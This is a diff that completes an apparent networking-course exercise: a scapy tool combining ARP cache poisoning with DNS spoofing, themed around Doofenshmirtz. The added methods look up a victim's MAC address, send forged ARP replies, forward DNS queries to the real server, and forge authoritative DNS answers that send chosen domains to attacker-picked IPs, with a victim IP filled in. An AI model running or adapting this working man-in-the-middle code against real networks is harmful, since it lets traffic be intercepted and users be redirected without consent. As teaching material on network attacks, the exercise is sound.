@@ -5,8 +5,8 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "???"  # Enter the computer you attack's IP.
-SECRATERY_IP = "???"  # Enter the attacker's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.4"  # Enter the computer you attack's IP.
+SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
 NETWORK_DNS_SERVER_IP = "???"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
@@ -49,16 +49,40 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        pass
+        # if already initialized, return the mac address
+        if self.target_mac:
+            return self.target_mac
+        #else send an ARP request to the target and wait for a response
+        # create ARP request for the target ip
+        arp_request = ARP(pdst=self.target_ip)
+        # create a broadcast packet to send the ARP request to all devices in the network
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        # combine the ARP request and the broadcast packet to create the final packet to send
+        arp_request_broadcast = broadcast / arp_request
+        # send the packet and wait for a response
+        # The srp function returns a tuple of two lists: the first list contains the answered packets, and the second list contains the unanswered packets.
+        # We are only interested in the answered packets, so we take the first element of the tuple.
+        answered_list = scapy.srp(arp_request_broadcast, timeout=2, iface=IFACE, verbose=False)[0]
+        # If we received a response, we can extract the target's mac address from the response packet. The response packet is a tuple of two elements: the first element is the sent packet, and the second element is the received packet. We can access the received packet using the index 1, and then we can access the source hardware address (hwsrc) field of the ARP layer to get the target's mac address.
+        if answered_list:
+            # If we received a response, we can extract the target's mac address from the response packet. The response packet is a tuple of two elements: the first element is the sent packet, and the second element is the received packet. We can access the received packet using the index 1, and then we can access the source hardware address (hwsrc) field of the ARP layer to get the target's mac address.
+            self.target_mac = answered_list[0][1].hwsrc
+            return self.target_mac
+        raise Exception(f"Could not get target mac address for {self.target_ip}")
 
     def spoof(self) -> None:
         """
         Sends an ARP spoof that convinces target_ip that we are spoof_ip.
         Increases spoof count b y one.
         """        
-
-        # Your code here...
-
+        # get the target's mac address, if not initialized yet, this will send an ARP request to the target and wait for a response
+        target_mac = self.get_target_mac()
+        # create an ARP response packet that convinces the target that we are the spoof_ip
+        # op field of 2 means it's an ARP response, pdst is the target ip, hwdst is the target mac, psrc is the spoof ip
+        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        # send the ARP response packet to the target
+        scapy.send(arp_response, iface=IFACE, verbose=False)
+        # increase the spoof count by one
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -111,7 +135,21 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        pass
+        # first, we send it to the real DNS server, and wait for a response
+        dns_request = IP(dst=self.real_dns_server_ip) / UDP(sport= pkt[UDP].sport ,dport=53) / DNS(rd=1, qd=pkt[DNS].qd)
+        response = sr1(dns_request, timeout=2, verbose=False)
+        # if we received a response, we can modify the source IP of the response to be
+        # our local IP, and then we can return the modified response
+        if response:
+            response[IP].src = SECRATERY_IP
+            # we also need to delete the length and checksum fields of the IP and UDP layers,
+            # because they will be recalculated when we send the packet
+            del response[IP].len
+            del response[IP].chksum
+            del response[UDP].len
+            del response[UDP].chksum
+            return response
+        raise Exception(f"Could not get real DNS response for {pkt[DNS].qd.qname.decode()} from real DNS server {self.real_dns_server_ip}")
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -122,7 +160,20 @@ class DnsHandler(object):
         @param to ip address to return from the DNS lookup.
         @return fake DNS response to the request.
         """
-        pass
+        # the source IP becomes the destination IP.
+        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        # the source port becomes the destination port, and the destination port becomes 53
+        udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+        # the DNS respose is harder
+        dns_layer = DNS(
+            id=pkt[DNS].id,  # we need to keep the same ID as the request, so the target will accept the response
+            qr=1,  # this is a response
+            aa=1, # this is an authoritative answer
+            an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=to) # the answer section contains a single record, with the same name as the request, and the IP address we want to return as the response
+        )
+        spoofed_pkt = ip_layer / udp_layer / dns_layer
+        return spoofed_pkt
+
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
         """
@@ -133,7 +184,20 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
-        pass
+        # we first check if the requested domain is in the spoof_dict, if it is, we return a spoofed response, otherwise we return a real response
+        requested_domain = pkt[DNS].qd.qname
+        if requested_domain in self.spoof_dict:
+            to_ip = self.spoof_dict[requested_domain]
+            spoofed_response = self.get_spoofed_dns_response(pkt, to_ip)
+            scapy.send(spoofed_response, iface=IFACE, verbose=False)
+            return f"Spoofed DNS response for {requested_domain.decode()} with IP {to_ip}"
+        else:
+            real_response = self.get_real_dns_response(pkt)
+            if real_response:
+                scapy.send(real_response, iface=IFACE, verbose=False)
+                return f"Forwarded DNS request for {requested_domain.decode()} to real DNS server and sent back the response"
+            else:
+                return f"Failed to get real DNS response for {requested_domain.decode()} from real DNS server"
 
     def run(self) -> None:
         """
